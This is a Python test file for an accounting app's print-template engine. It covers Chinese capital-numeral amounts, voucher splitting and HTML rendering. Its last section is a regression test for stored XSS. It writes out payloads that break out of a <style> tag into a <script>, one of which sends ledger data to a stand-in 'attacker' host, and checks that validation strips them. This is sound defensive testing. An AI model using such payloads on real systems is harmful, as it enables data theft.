"""打印模板引擎：模板归一化、纸型、金额大写、HTML 渲染。"""
import re
from decimal import Decimal

import pytest

from app.printing.template import (
    DEFAULT_TEMPLATES,
    cn_date,
    PAPERS,
    SCOPES,
    merge_defaults,
    render_table_page,
    render_voucher_page,
    render_voucher_sheet,
    split_voucher,
    to_cn_capital,
    validate_template,
    voucher_rows_per_page,
    voucher_slots_per_page,
    wrap_pages,
)


# --------------------------------------------------------------------- 金额大写


@pytest.mark.parametrize(
    "raw,want",
    [
        ("0", "零元整"),
        ("0.05", "零元伍分"),
        ("0.10", "零元壹角整"),
        ("0.50", "零元伍角整"),
        ("0.57", "零元伍角柒分"),
        ("305.00", "叁佰零伍元整"),
        ("1234.56", "壹仟贰佰叁拾肆元伍角陆分"),
        ("100000", "壹拾万元整"),
        ("100001", "壹拾万零壹元整"),
        ("100100", "壹拾万零壹佰元整"),
        ("1000000", "壹佰万元整"),
        ("20000.07", "贰万元零角柒分"),
        ("100000000", "壹亿元整"),
        ("101000000", "壹亿零壹佰万元整"),
        ("3050000.50", "叁佰零伍万元伍角整"),
        ("-1234.56", "负壹仟贰佰叁拾肆元伍角陆分"),
    ],
)
def test_金额大写(raw, want):
    assert to_cn_capital(Decimal(raw)) == want


def test_金额大写非法输入返回空串():
    assert to_cn_capital("不是数字") == ""


# --------------------------------------------------------------------- 模板归一化


def test_每个内置范围都能通过校验():
    for scope in SCOPES:
        tpl = validate_template(scope, {})
        assert tpl["columns"], scope
        assert abs(sum(c["width"] for c in tpl["columns"]) - 100) < 0.01, scope


def test_列宽归一化到100():
    tpl = validate_template("BALANCE", {"columns": [
        {"key": "code", "width": 1},
        {"key": "name", "width": 1},
        {"key": "opening_debit", "width": 2},
    ]})
    widths = [c["width"] for c in tpl["columns"]]
    assert widths == [25.0, 25.0, 50.0]


def test_未知纸型报错并列出可选项():
    with pytest.raises(ValueError) as e:
        validate_template("VOUCHER", {"paper": "泰坦纸"})
    assert "A4" in str(e.value)


def test_横版纸型强制横向():
    tpl = validate_template("VOUCHER", {"paper": "A4_LANDSCAPE", "orientation": "portrait"})
    assert tpl["orientation"] == "landscape"


def test_非法方向被纠正为纵向():
    assert validate_template("VOUCHER", {"orientation": "diagonal"})["orientation"] == "portrait"


def test_非法对齐被纠正为左对齐():
    tpl = validate_template("VOUCHER", {"columns": [{"key": "a", "align": "居中"}]})
    assert tpl["columns"][0]["align"] == "left"


def test_没有列时报错():
    with pytest.raises(ValueError):
        validate_template("VOUCHER", {"columns": []})


def test_列缺少key时报错():
    with pytest.raises(ValueError) as e:
        validate_template("VOUCHER", {"columns": [{"label": "没写字段名"}]})
    assert "key" in str(e.value)


def test_负页边距被夹到0():
    tpl = validate_template("VOUCHER", {"margins": {"top": -5, "left": -1}})
    assert tpl["margins"]["top"] == 0.0
    assert tpl["margins"]["left"] == 0.0


def test_未知范围报错():
    with pytest.raises(ValueError):
        validate_template("PAYROLL", {})


# --------------------------------------------------------------------- 向前兼容


def test_新增配置项不影响老模板():
    """老模板里没有新字段时，靠默认值补齐 —— 这是「框架不妨碍迭代」的关键。"""
    old = {"title": {"text": "老模板"}}          # 模拟只存了标题的老数据
    tpl = validate_template("VOUCHER", old)
    assert tpl["title"]["text"] == "老模板"
    assert tpl["font"]["family"]                 # 老模板没存字体，靠默认值
    assert tpl["margins"]["top"] == 10.0
    assert tpl["footer"]["show_page_no"] is True


def test_merge_defaults不修改入参():
    src = {"title": {"text": "X"}}
    merge_defaults("VOUCHER", src)
    assert src == {"title": {"text": "X"}}


def test_覆盖值优先于默认值():
    tpl = validate_template("VOUCHER", {"title": {"text": "自定义"}, "font": {"size": 14}})
    assert tpl["title"]["text"] == "自定义"
    assert tpl["title"]["bold"] is True        # 没被覆盖的仍取默认
    assert tpl["font"]["size"] == 14
    assert tpl["font"]["family"] == "宋体"


# --------------------------------------------------------------------- 渲染


def test_凭证页含关键要素():
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {"company": "紫欣星悦荟", "book": "租金账套"},
                               {"voucher_no": "记0001", "voucher_date": "2026-01-05",
                                "attachments": 2, "remark": "首月租金",
                                "total_debit": "1234.56", "total_credit": "1234.56",
                                "entries": [
                                    {"line_no": 1, "summary": "收租", "subject_code": "1002",
                                     "subject_name": "银行存款", "direction": "DEBIT",
                                     "amount": "1234.56"},
                                ]},
                               1, 1)
    assert "@page" in html
    assert "记0001" in html and "紫欣星悦荟" in html
    assert "壹仟贰佰叁拾肆元伍角陆分" in html   # 金额大写
    assert "首月租金" in html                     # 备注
    assert "附单据" in html                       # 附单据数
    assert "2026年01月05日" in html                # 制单日期按中文写
    assert "凭证字号" in html


def test_表格页含表头与行():
    tpl = validate_template("BALANCE", {})
    rows = [{"code": "1002", "name": "银行存款", "level": 1,
             "opening_debit": "200000", "period_credit": "97000"}]
    html = render_table_page(tpl, {"company": "X", "period": "2026-12"}, rows, 1, 1)
    assert "科目余额表" in html
    assert "银行存款" in html and "200,000.00" in html
    # 级次是居中列，不能被当成金额格式化成 "1.00"
    assert ">1<" in html and "1.00" not in html


def test_表格页空数据显示占位():
    html = render_table_page(validate_template("BALANCE", {}), {}, [], 1, 1)
    assert "无数据" in html


def test_渲染会转义HTML():
    """科目名里带尖括号时不能破坏 DOM。"""
    tpl = validate_template("BALANCE", {})
    html = render_table_page(tpl, {}, [{"name": "<script>x</script>", "code": "1"}], 1, 1)
    assert "<script>x</script>" not in html
    assert "&lt;script&gt;" in html


def test_纸型映射表完整():
    for key in ("A4", "A3", "A5", "B5"):
        assert PAPERS[key]["w"] > 0 and PAPERS[key]["h"] > 0


def test_横版纸型打出来确实是横向():
    """``A4_LANDSCAPE`` 断言的是**渲染结果**而不是表里的宽高 ——
    表里存什么无所谓，用户拿到的是 ``@page`` 里那个尺寸。
    曾经把横向宽高存进 ``PAPERS``，又被 ``orientation`` 换了一遍，
    名字叫横版、实际打出 A4 纵向。"""
    tpl = validate_template("VOUCHER", {"paper": "A4_LANDSCAPE"})
    doc = render_table_page(tpl, {}, [], 1, 1)
    assert _page_size(doc) == "297mm 210mm"
    assert "210mm 297mm" not in doc


# --------------------------------------------------------------------- 设计器实时预览
#
# 用户诉求是「左边改版式，右边立刻变」。这靠一个接口保证：
# 预览吃的是**还没保存的草稿**，并且和正式打印共用同一个渲染函数。


def test_预览用草稿模板渲染(client, auth, book, periods, make_voucher):
    """改标题后预览应立刻出现新标题，不必先保存。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "首月租金")],
                 cr=[("5001", 300, "首月租金")], posted=True)
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"title": {"text": "草稿专用抬头"}},
              "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200, r.text
    assert "草稿专用抬头" in r.text


def test_预览不写库(client, auth, book, periods, make_voucher):
    """预览只渲染不落库 —— 否则调一次版式就凭空多出一个模板。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "x")], cr=[("5001", 300, "x")], posted=True)
    before = len(client.get(f"/api/books/{book.id}/print/templates", headers=auth).json())

    client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"title": {"text": "只看一眼"}},
              "period_id": periods[1].id},
        headers=auth,
    )

    after = client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()
    assert len(after) == before


def test_预览与正式打印排版一致(client, auth, book, periods, make_voucher):
    """同一份模板内容，预览和打印必须渲染出同样的 HTML。

    这是「所见即所得」的全部含义 —— 两边一旦分叉，预览就失去意义了。
    """
    make_voucher("2026-01-05", dr=[("1001", 300, "首月租金")],
                 cr=[("5001", 300, "首月租金")], posted=True)
    content = {"title": {"text": "记 账 凭 证"}, "font": {"size": 9}}

    prev = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": content, "period_id": periods[1].id},
        headers=auth,
    )
    # 打印接口读的是「该范围的内置默认模板」，这里传同样的默认内容
    tpl_id = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "对照模板", "content": content},
        headers=auth,
    ).json()["id"]
    printed = client.get(
        f"/api/books/{book.id}/print/vouchers.html",
        params={"period_id": periods[1].id, "template_id": tpl_id},
        headers=auth,
    )

    assert prev.status_code == 200 and printed.status_code == 200

    def body(h):
        # 预览页顶部多一行「只显示前 3 张」的说明，那是给人看的，不属于排版
        return h.split("<body>")[1].replace(
            '<p class="page-note">预览只显示前 3 张凭证，打印时输出该期间全部凭证。</p>', ""
        )

    assert body(prev.text) == body(printed.text)


def test_草稿半成品时预览给出可读提示(client, auth, book, periods):
    """把所有列删掉时不该 500 —— 设计器正要允许你这么干。"""
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {"columns": []}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 422
    assert "预览" in r.json()["detail"]


def test_预览不传期间时与打印一致地回落到最后一期(client, auth, book, make_voucher):
    """_period() 一直有「不传就取最后一期」的兜底，预览不能自己另立一套规则。"""
    make_voucher("2026-01-05", dr=[("1001", 300, "x")], cr=[("5001", 300, "x")], posted=True)
    r = client.post(f"/api/books/{book.id}/print/preview",
                    json={"scope": "BALANCE", "content": {}}, headers=auth)
    assert r.status_code == 200, r.text
    assert "2026-12" in r.text


def test_预览凭证只取前三张(client, auth, book, periods, make_voucher):
    """预览限定张数，否则一个大期间的凭证能把改版式卡死。"""
    for i in range(1, 7):
        make_voucher(f"2026-01-0{i}", dr=[("1001", 100 + i, f"第{i}笔")],
                     cr=[("5001", 100 + i, f"第{i}笔")], posted=True)
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "VOUCHER", "content": {}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200
    assert r.text.count('class="grid"') == 3
    assert "预览只显示前 3 张" in r.text


def test_只读账套也能预览(client, auth, db, book, periods, plain_user):
    """预览是只读动作，只读账套必须能用（保存模板才需要写权限）。"""
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="VIEWER"))
    db.commit()
    r = client.post(
        f"/api/books/{book.id}/print/preview",
        json={"scope": "BALANCE", "content": {}, "period_id": periods[1].id},
        headers=auth,
    )
    assert r.status_code == 200, r.text


# --------------------------------------------------------------------- 凭证分片
#
# 会计凭证的物理规则：一张最多 5 行摘要，超出的行续到下一张凭证打印，
# 凭证号带分页号（记001 - 001/006），这样撕开的两张仍然对得上同一张凭证。


def _entries(n: int) -> list[dict]:
    return [
        {"line_no": i, "summary": f"摘要{i}", "subject_code": "1002",
         "subject_name": "银行存款", "direction": "DEBIT" if i % 2 else "CREDIT",
         "amount": "10"}
        for i in range(1, n + 1)
    ]


def _voucher(no: str = "记001", n: int = 3, **kw) -> dict:
    return {"voucher_no": no, "voucher_date": "2026-01-05", "attachments": 1,
            "remark": "首月租金", "entries": _entries(n), **kw}


def test_五行以内不拆但仍带分页号():
    """不拆的是 001/001 —— 和拆过的那几张长得一样，撕开/没撕开一眼能认出来。"""
    pieces = split_voucher(_voucher(n=5), 5)
    assert len(pieces) == 1
    assert pieces[0]["voucher_no"] == "记001 - 001/001"
    # 账上的凭证号一个字都没动，分页号只是打印时加的
    assert pieces[0]["entries"] == _entries(5)


def test_日期按中文打印():
    """凭证上的日期是「2026年01月05日」，不是 ISO 的 2026-01-05。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_page(tpl, {}, _voucher(), 1, 1)
    assert "2026年01月05日" in html
    assert "2026-01-05" not in html


def test_非ISO日期原样输出():
    assert cn_date("") == ""
    assert cn_date("不是日期") == "不是日期"


def test_超五行拆成多张并加分页号():
    """分页号写成 记001 - 001/006：既是凭证号，又看得出是第几张、共几张。"""
    pieces = split_voucher(_voucher(n=12), 5)
    assert [p["voucher_no"] for p in pieces] == [
        "记001 - 001/003", "记001 - 002/003", "记001 - 003/003"]
    assert [len(p["entries"]) for p in pieces] == [5, 5, 2]


def test_分页编号格式可配():
    """模板可以换写法，也能换成「起始行/总行数」。"""
    pieces = split_voucher(_voucher(n=29), 5, "{voucher_no} - {first}/{lines}")
    assert pieces[0]["voucher_no"] == "记001 - 001/029"
    assert pieces[1]["voucher_no"] == "记001 - 006/029"
    assert pieces[-1]["voucher_no"] == "记001 - 026/029"


def test_分页编号按模板走():
    tpl = validate_template("VOUCHER", {"voucher": {"split_format": "{voucher_no}（续{page}）"}})
    fmt = tpl["voucher"]["split_format"]
    assert split_voucher(_voucher(n=12), 5, fmt)[1]["voucher_no"] == "记001（续002）"


def test_分页编号空串退回默认写法():
    """输入框被清空不能变成「不加分页号」—— 没拆过的凭证本来就该是记001。"""
    tpl = validate_template("VOUCHER", {"voucher": {"split_format": "   "}})
    pieces = split_voucher(_voucher(n=12), 5, tpl["voucher"]["split_format"])
    assert pieces[0]["voucher_no"] == "记001 - 001/003"


def test_分片合计逐页累计():
    """拆页是排版，不是把一张凭证的账算成好几张：
    第二张印前两张加起来的数，最后一张等于整张凭证的合计。"""
    pieces = split_voucher(_voucher(n=12), 5)
    assert pieces[0]["total_debit"] == "30"      # 第 1、3、5 行
    assert pieces[1]["total_debit"] == "50"      # 加上第 7、9 行
    assert pieces[2]["total_debit"] == "60"      # 加上第 11 行 = 整张凭证
    assert pieces[0]["total_credit"] == "20"
    assert pieces[-1]["total_credit"] == "60"


def test_最后一页合计等于整张凭证():
    """最后一页必须能和账上的原凭证对上，不然撕开就没法核。"""
    whole = _voucher(n=29)
    pieces = split_voucher(whole, 5)
    dr = sum(float(e["amount"]) for e in whole["entries"] if e["direction"] == "DEBIT")
    assert float(pieces[-1]["total_debit"]) == dr


def test_累计合计的金额大写跟着走():
    """把「仅在尾页显示」关掉后，合计大写取的是这张分片的累计数。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "cap", "type": "text", "bind": "capital",
         "text": "合计大写：{capital}", "x": 3, "y": 82, "w": 64, "h": 5,
         "last_page_only": False},
    ]})
    pieces = split_voucher(_voucher(n=12), 5)
    html = render_voucher_sheet(tpl, {}, pieces, 1, 1)
    assert "陆拾元整" in html      # 最后一张 = 整张凭证的合计
    assert "叁拾元整" in html      # 第一张 = 前 5 行的累计


def test_合计大写默认只在尾页显示():
    """拆页后只有最后一张是完整的凭证。

    每张都印一个累计合计，看起来会像每张都是整张凭证的合计 —— 默认只在尾页印。
    """
    tpl = validate_template("VOUCHER", {})
    pieces = split_voucher(_voucher(n=12), 5)
    pages = [render_voucher_sheet(tpl, {}, [p], 1, 1) for p in pieces]
    assert [html.count("合计大写") for html in pages] == [0, 0, 1]
    assert "陆拾元整" in pages[-1]        # 尾页印的是整张凭证的大写
    assert "叁拾元整" not in pages[0]     # 续页上的分片合计不印


def test_没拆过的凭证照常印合计大写():
    """不拆页时整张凭证就是尾页，不能因为默认开关而把合计藏掉。"""
    html = render_voucher_page(validate_template("VOUCHER", {}), {}, _voucher(n=3), 1, 1)
    assert "合计大写" in html


def test_只有合计大写默认仅尾页():
    """凭证字号带着分页号，续页上不能没有，所以只有合计大写默认关到尾页。"""
    tpl = validate_template("VOUCHER", {})
    flags = {el["bind"]: el["last_page_only"]
             for el in tpl["elements"] if el["type"] == "text"}
    assert flags["capital"] is True
    assert flags["voucher_no"] is False
    assert flags["remark"] is False


def test_仅尾页开关不影响表格():
    """表格每页都要有，拆页只是把分录摊开，续页上没有表头表尾就没法核。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "t", "type": "table", "bind": "entries", "x": 3, "y": 23,
         "w": 94, "h": 57, "last_page_only": True},
    ]})
    pieces = split_voucher(_voucher(n=12), 5)
    htmls = [render_voucher_sheet(tpl, {}, [p], 1, 1) for p in pieces]
    assert all("class=\"grid\"" in html for html in htmls)


def test_分片保留原始行号():
    """续页的第 6 行仍然印「6」，不能从 1 重新数 —— 对账时按行号核。"""
    assert split_voucher(_voucher(n=12), 5)[1]["entries"][0]["line_no"] == 6


def test_分片行数可调但上限五行():
    tpl = validate_template("VOUCHER", {"voucher": {"rows_per_page": 99}})
    assert voucher_rows_per_page(tpl) == 5
    assert len(split_voucher(_voucher(n=12), voucher_rows_per_page(tpl))) == 3


# --------------------------------------------------------------------- 模板改名


def test_模板可以改名且不动版式(client, auth, book):
    """界面上「重命名」走的就是这个 PUT：只换名字，内容一个字都不许变。"""
    created = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "改名前", "content": {"paper": "A5"}},
        headers=auth,
    ).json()
    before = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                        headers=auth).json()["content"]

    r = client.put(f"/api/books/{book.id}/print/templates/{created['id']}",
                   json={"name": "改名后"}, headers=auth)
    assert r.status_code == 200, r.text
    after = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                       headers=auth).json()
    assert after["name"] == "改名后"
    assert after["content"] == before
    names = [t["name"] for t in client.get(f"/api/books/{book.id}/print/templates",
                                           headers=auth).json()]
    assert "改名后" in names


def test_改名不影响已保存的版式内容(client, auth, book):
    """改名不是「重新保存」：content 没传就不能动它，否则默认值会盖掉用户改的纸型。"""
    created = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "A5 版", "content": {"paper": "A5"}},
        headers=auth,
    ).json()
    client.put(f"/api/books/{book.id}/print/templates/{created['id']}",
               json={"name": "A5 版（终版）"}, headers=auth)
    again = client.get(f"/api/books/{book.id}/print/templates/{created['id']}",
                       headers=auth).json()
    assert again["content"]["paper"] == "A5"


# --------------------------------------------------------------------- 每页几张


def test_A4一页两张():
    assert voucher_slots_per_page(validate_template("VOUCHER", {})) == 2


def test_A5一页一张():
    tpl = validate_template("VOUCHER", {"paper": "A5"})
    assert voucher_slots_per_page(tpl) == 1
    html = render_voucher_sheet(tpl, {}, [_voucher(), _voucher()], 1, 1)
    assert "slots-1" in html


def test_A4纵向上下排横向左右排():
    tpl = validate_template("VOUCHER", {})
    assert "slots-2 flow-rows" in render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    land = validate_template("VOUCHER", {"orientation": "landscape"})
    assert "slots-2 flow-columns" in render_voucher_sheet(land, {}, [_voucher()], 1, 1)


def test_一张纸上放两张凭证():
    html = render_voucher_sheet(validate_template("VOUCHER", {}), {},
                                [_voucher("记001"), _voucher("记002")], 1, 1)
    assert html.count('class="voucher-slot"') == 2
    assert html.count('class="grid"') == 2
    assert "记002" in html


def test_元素按槽位百分比定位():
    """元素坐标是「当前槽位」的百分比，所以模板不用为 A4/A5 各存一份。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "left:3.0%;top:23.0%" in html or "left:3%;top:23%" in html


def test_隐藏元素不输出():
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "a", "type": "text", "bind": "remark", "text": "备注：{remark}", "visible": False},
        {"id": "b", "type": "text", "bind": "voucher_no", "text": "号：{voucher_no}"},
    ]})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "首月租金" not in html
    assert "号：记001" in html


def test_开关关掉后元素不输出():
    """旧模板的 meta/show 开关在元素化之后仍然有效，不能让它们失效。"""
    tpl = validate_template("VOUCHER", {"meta": {"attachments": False}})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "附单据" not in html


# --------------------------------------------------------------------- 端到端


def test_十二行凭证打印时占满三张A4(client, auth, book, periods, make_voucher):
    """12 行 → 3 个槽位；A4 一页 2 张，所以是 2 张纸。"""
    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(6)],
                 cr=[("5001", 10, f"贷{i}") for i in range(6)], posted=True)
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id}, headers=auth)
    assert r.status_code == 200, r.text
    assert "记001 - 001/003" in r.text and "记001 - 002/003" in r.text
    assert "记001 - 003/003" in r.text
    assert r.text.count('class="voucher-slot"') == 3      # 3 个槽位
    assert r.text.count('<div class="page">') == 2         # A4 两槽位 → 2 张纸


def test_拆页凭证整批只印一次合计大写(client, auth, book, periods, make_voucher):
    """12 行 → 3 个分片，A4 一页 2 张；合计大写只在尾页那一张上出现。"""
    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(6)],
                 cr=[("5001", 10, f"贷{i}") for i in range(6)], posted=True)
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id}, headers=auth)
    assert r.status_code == 200, r.text
    assert r.text.count("合计大写") == 1
    assert "陆拾元整" in r.text          # 尾页印的是整张凭证的合计


def test_A5打印时每页一张(client, auth, book, periods, make_voucher):
    make_voucher("2026-01-05", dr=[("1001", 10, "x")], cr=[("5001", 10, "x")],
                 posted=True)
    make_voucher("2026-01-06", dr=[("1001", 20, "y")], cr=[("5001", 20, "y")],
                 posted=True)
    tpl_id = client.post(
        f"/api/books/{book.id}/print/templates",
        json={"scope": "VOUCHER", "name": "A5", "content": {"paper": "A5"}},
        headers=auth,
    ).json()["id"]
    r = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"period_id": periods[1].id, "template_id": tpl_id}, headers=auth)
    assert r.status_code == 200, r.text
    assert r.text.count('<div class="page">') == 2     # 一页一张 → 2 张纸


def test_预览的分片与正式打印一致(client, auth, book, periods, make_voucher):
    """拆页最容易在预览里跑偏：同一份内容，两边必须拆成一样的槽位。"""
    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(4)],
                 cr=[("5001", 10, f"贷{i}") for i in range(4)], posted=True)
    content = {"paper": "A4"}
    prev = client.post(f"/api/books/{book.id}/print/preview",
                       json={"scope": "VOUCHER", "content": content,
                             "period_id": periods[1].id}, headers=auth)
    tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                         json={"scope": "VOUCHER", "name": "对照", "content": content},
                         headers=auth).json()["id"]
    printed = client.get(f"/api/books/{book.id}/print/vouchers.html",
                         params={"period_id": periods[1].id, "template_id": tpl_id},
                         headers=auth)

    def body(h):
        return h.split("<body>")[1].replace(
            '<p class="page-note">预览只显示前 3 张凭证，打印时输出该期间全部凭证。</p>', "")

    assert "记001 - 002/002" in prev.text
    assert body(prev.text) == body(printed.text)


def test_行高固定且每行一致():
    """固定版式：表头 +（分录行 + 合计行）必须恰好占满表格。

    不能只写 height:100% 让浏览器自己分配 —— 它把余量塞给最后一行，
    合计行会变成一条肥带，空行又比有字的分录行矮胖不一。
    """
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    m = re.search(r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html)
    assert m, "表格没有给出行高变量"
    head, row = float(m.group(1)), float(m.group(2))
    assert head == 14
    # 5 行摘要 + 1 行合计
    assert abs(head + row * 6 - 100) < 0.01, (head, row)


def test_行数减小时行高同步变大():
    """行数少了，同一高度里分给每行的就要更多，否则表格撑不满。"""
    out = {}
    for n in (2, 5):
        tpl = validate_template("VOUCHER", {"voucher": {"rows_per_page": n}})
        html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
        head, row = (float(x) for x in re.search(
            r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
        out[n] = head + row * (n + 1)
        assert abs(out[n] - 100) < 0.01
    assert out[2] > out[5] or out[2] == out[5]   # 都是 100%，行高本身才变大


def test_空行补齐到固定行数():
    """只有 2 条分录时也要补足 5 行，否则两张凭证叠在一起高度对不齐。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
    tbody = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    # 合计行是 <tr class="total">，所以按 "<tr" 数：2 条分录 + 3 个空行 + 1 合计行
    assert tbody.count("<tr") == 6


def test_借贷方金额按方向落到对应列():
    """分录只有 direction + amount，debit / credit 两列必须按方向取值。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
    body = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    first, second = body.split("<tr>")[1], body.split("<tr>")[2]
    assert '<td class="num">10.00</td>' in first      # 第 1 行借方
    assert '<td class="num"></td>' in first           # 贷方留空，不重复印金额
    assert '<td class="num"></td>' in second          # 第 2 行贷方
    assert '<td class="num">10.00</td>' in second


def test_表格框线可单独关掉():
    """关框线只去线，表格结构和行高还得在 —— 凭证是固定版式，塌一块就废了。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "t", "type": "table", "bind": "entries", "border": False,
         "x": 3, "y": 20, "w": 94, "h": 60},
    ]})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    # 只看元素上的 class，别去全文找 "no-border" —— 样式表里本来就有这个词
    assert 'class="voucher-element table no-border"' in html
    assert html.count('<table class="grid"') == 1
    assert "--vrow:" in html                     # 行高照样算给行
    assert "摘　要" in html                        # 内容照印


# --------------------------------------------------------------------- 表头与合计行


def _table_tpl(**el):
    base = {"id": "t", "type": "table", "bind": "entries", "x": 3, "y": 20, "w": 94, "h": 60}
    return validate_template("VOUCHER", {"elements": [{**base, **el}]})


def test_表头默认显示():
    tpl = validate_template("VOUCHER", {})
    table_el = next(e for e in tpl["elements"] if e["type"] == "table")
    assert table_el["show_header"] is True
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<thead>" in html and "摘　要" in html


def test_表头可以关掉且高度让给分录行():
    """关掉表头不能塌一行 —— 剩下的高度全给分录行，表格还是占满原位。"""
    tpl = _table_tpl(show_header=False)
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<thead>" not in html
    head, row = (float(x) for x in re.search(
        r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
    assert head == 0
    assert abs(head + row * 6 - 100) < 0.01
    # 分录 5 行 + 合计行，正文照旧
    assert html.count("<tr") >= 6


def test_表头高度可配():
    tpl = _table_tpl(header_height=25)
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    head, row = (float(x) for x in re.search(
        r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
    assert head == 25
    assert abs(head + row * 6 - 100) < 0.01
    assert "摘　要" in html


def test_表头高度越界被夹住():
    tpl = _table_tpl(header_height=999)
    assert tpl["elements"][0]["header_height"] == 100
    tpl2 = _table_tpl(header_height="不是数字")
    assert tpl2["elements"][0]["header_height"] == 14


def test_合计文字可配():
    """合计行那个标签归模板管，不写就还是「合　计」。"""
    assert "合　计" in render_voucher_sheet(_table_tpl(), {}, [_voucher()], 1, 1)
    html = render_voucher_sheet(_table_tpl(total_label="本页合计"), {}, [_voucher()], 1, 1)
    assert "本页合计" in html and "合　计" not in html


def test_合计文字可以留空():
    html = render_voucher_sheet(_table_tpl(total_label=""), {}, [_voucher()], 1, 1)
    body = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    total_row = [r for r in body.split("<tr") if "total" in r][0]
    assert "合" not in total_row


def test_表格默认有框线():
    tpl = validate_template("VOUCHER", {})
    table_el = next(e for e in tpl["elements"] if e["type"] == "table")
    assert table_el["border"] is True
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert 'class="voucher-element table no-border"' not in html
    assert 'class="voucher-element table"' in html


# ===================================================================== P0-2 模板存储型 XSS
#
# 攻击链四环：
#   ① font.family / title.align / title.size / subtitle.align / subtitle.size
#      未经校验直接拼进 _page_css 生成的 <style>；
#   ② validate_template 只校验纸型/页边距/列 align/line_width/line_style，
#      上述五处一个都没管；
#   ③ print_template 没有 book_id —— 模板是全局的；
#   ④ 打印页只挂 get_my_book，VIEWER 也会渲染这张全局模板。
#
# 前两环在这里用**单元测试**钉死（③④ 属于 API 与数据模型层，
# 见 test_打印模板写权限只认全局门禁）。下面的用例构造真实攻击载荷，
# 断言它既过不了校验、也进不了渲染结果。


#: 审查报告里的原始攻击载荷：闭合 font-family 的引号 → 闭合 style →
#: 跨出 <style> 执行脚本 → 再开一个 <style> 把文档接回去（看起来完全正常）。
XSS_FONT_FAMILY = (
    '宋体"; } </style><script>fetch("/api/books/B/ledger/general?period_id=1")'
    '.then(r=>r.text()).then(t=>fetch("http://attacker",{method:"POST",body:t}))'
    '</script><style> body{'
)
#: align / size 是**无引号**拼接，比 font-family 更好利用：连闭合引号都不需要。
XSS_ALIGN = "center; } </style><script>alert(1)</script><style> .x{"
XSS_SIZE = "16; } </style><script>alert(2)</script><style> .y{"


def test_恶意字体名被白名单挡下():
    tpl = validate_template("VOUCHER", {"font": {"family": XSS_FONT_FAMILY}})
    assert tpl["font"]["family"] == "宋体"


def test_白名单内的字体名照常保留():
    """不能为了防注入把字体写死 —— 设计器本来就让人选。"""
    for name in ("黑体", "楷体", "仿宋", "微软雅黑", "Times New Roman"):
        assert validate_template("VOUCHER", {"font": {"family": name}})["font"]["family"] == name


def test_恶意标题对齐被白名单挡下():
    tpl = validate_template("VOUCHER", {"title": {"align": XSS_ALIGN}})
    assert tpl["title"]["align"] == "center"


def test_恶意标题字号被夹回区间():
    tpl = validate_template("VOUCHER", {"title": {"size": XSS_SIZE}})
    assert isinstance(tpl["title"]["size"], float)
    assert 8 <= tpl["title"]["size"] <= 48


def test_恶意副标题对齐和字号被挡下():
    tpl = validate_template("VOUCHER",
                            {"subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE}})
    assert tpl["subtitle"]["align"] == "center"
    assert 8 <= tpl["subtitle"]["size"] <= 48


def test_字号超出区间被夹住():
    assert validate_template("VOUCHER", {"font": {"size": 9999}})["font"]["size"] == 24
    assert validate_template("VOUCHER", {"font": {"size": -3}})["font"]["size"] == 6


